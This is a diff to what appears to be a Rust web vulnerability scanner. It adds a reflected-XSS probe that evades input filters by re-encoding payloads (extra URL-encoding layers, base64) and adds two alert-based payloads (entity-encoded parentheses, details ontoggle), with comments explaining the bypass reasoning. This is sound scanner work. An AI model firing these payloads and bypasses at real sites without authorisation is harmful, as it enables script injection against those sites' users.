@@ -3950,6 +3950,73 @@ fn contains_ci(hay: &str, needle: &str) -> bool {
             .contains(&needle.to_ascii_lowercase())
 }
 
+/// Reflected XSS where the filter runs before the app's own decoding.
+///
+/// An app that checks for `<` and then URL-decodes the value has checked the
+/// wrong string. Sending the payload one encoding layer up steps over the
+/// check: `%253C` passes a `<` test and arrives at the sink as `%3C`, which
+/// the app decodes to `<`. Same for a parameter the app base64-decodes, where
+/// a raw payload never reaches the sink at all and the app answers a fixed
+/// error.
+///
+/// Nothing about the oracle changes. Only the wire encoding of the payload
+/// moves; the detector is still the whole tag back raw in the response, so a
+/// target that encodes `<` on the way out cannot produce it.
+///
+/// Two payloads and three layers, and it runs only where the marker reflected
+/// and every payload came back filtered, which is the one place the requests
+/// are worth spending. Measured against xssmaze: 3 endpoints want base64, 3
+/// want a second URL layer and 1 wants a third.
+async fn probe_xss_encoded(
+    client: &Client,
+    site: &Site,
+    cases: &[(&str, String, String)],
+) -> Option<Value> {
+    use base64::Engine as _;
+    for (ctx, payload, detector) in cases.iter().take(2) {
+        let once = probe::pct_encode(payload);
+        let layers = [
+            ("a second URL-encoding layer", once.clone()),
+            ("a third URL-encoding layer", probe::pct_encode(&once)),
+            (
+                "base64",
+                base64::engine::general_purpose::STANDARD.encode(payload),
+            ),
+        ];
+        for (how, wire) in layers {
+            let Some(r) = send_site(client, site, &wire).await else {
+                continue;
+            };
+            if !(executes_in_browser(&r) && !csp_admits_no_script(&r))
+                || !contains_ci(&r.body, detector)
+            {
+                continue;
+            }
+            let again = send_site(client, site, &wire).await;
+            if !again
+                .map(|x| contains_ci(&x.body, detector))
+                .unwrap_or(false)
+            {
+                continue;
+            }
+            return Some(finding(
+                "xss",
+                "Reflected cross-site scripting (XSS)",
+                "high",
+                site,
+                format!(
+                    "A payload injected into the {} was rejected as sent and accepted through {}: `{}` appears raw and unescaped in the {} response. The filter runs before the application's own decoding, so it inspects a string the sink never sees.",
+                    site.where_label(),
+                    how,
+                    detector,
+                    ctx
+                ),
+            ));
+        }
+    }
+    None
+}
+
 /// Reflected XSS where `<` is unavailable but the value lands inside a tag.
 ///
 /// Tried only after every tag payload has failed, so it costs one request on
@@ -4053,6 +4120,14 @@ async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
     // that: `<svg onload=...>` and `<script>` come back empty, and
     // `<ImG SrC=x OnErRoR=...>` comes back raw inside the div.
     //
+    // Seven in total, and the last three were each chosen by measuring the
+    // marginal gain of a candidate rather than by picking well-known payloads.
+    // Sixteen candidates were tried against the endpoints the first four
+    // missed, including the usual marquee, autofocus, audio, nested-tag and
+    // context-break shapes; fourteen of them recovered nothing the other two
+    // did not already cover. Adding all sixteen would have been sixteen extra
+    // requests per site for the benefit of two payloads.
+    //
     // The fifth is a plain `<script>`, and it is last because it only costs a
     // request where all four others already failed. Every one of the first four
     // carries an event handler on a non-script tag, so a filter that strips
@@ -4064,7 +4139,7 @@ async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
     // same shape as the others, the opening tag and the closing tag back raw,
     // so it holds the oracle's line: a target that encodes `<` or `>` cannot
     // produce it.
-    let cases: [(&str, String, String); 5] = [
+    let cases: [(&str, String, String); 7] = [
         (
             "HTML",
             format!("{m}\"'><img src=x onerror=alert({m})>"),
@@ -4089,6 +4164,24 @@ async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
             "HTML",
             format!("{m}\"'><script>alert({m})</script>"),
             format!("<script>alert({m})</script>"),
+        ),
+        // Entity-encoded parentheses, for a filter that strips `(` and `)` and
+        // leaves everything else. A browser decodes entities in an attribute
+        // value before the handler is compiled, so this runs exactly as the
+        // literal form would, and the detector still needs the whole tag back.
+        (
+            "HTML",
+            format!("{m}\"'><img src=x onerror=alert&lpar;{m}&rpar;>"),
+            format!("<img src=x onerror=alert&lpar;{m}&rpar;>"),
+        ),
+        // An unlisted handler on a tag that fires it without the user doing
+        // anything. `open` makes `ontoggle` run on parse, which matters: a
+        // payload needing a click is a weaker finding, and that is why this is
+        // `details` rather than any of the dozen other spare handlers.
+        (
+            "HTML",
+            format!("{m}\"'><details open ontoggle=alert({m})>"),
+            format!("<details open ontoggle=alert({m})>"),
         ),
     ];
     for (ctx, payload, detector) in &cases {
@@ -4139,7 +4232,11 @@ async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
     }
     // Every tag payload failed, so either the app encodes `<` or it filters
     // tag names. If the value sits inside a tag, it can still carry a handler.
-    probe_xss_attribute(client, site, m, &plain).await
+    if let Some(f) = probe_xss_attribute(client, site, m, &plain).await {
+        return Some(f);
+    }
+    // Or the filter saw a string the sink never sees.
+    probe_xss_encoded(client, site, &cases).await
 }
 
 // ---------------------------------------------------------------- LFI / traversal
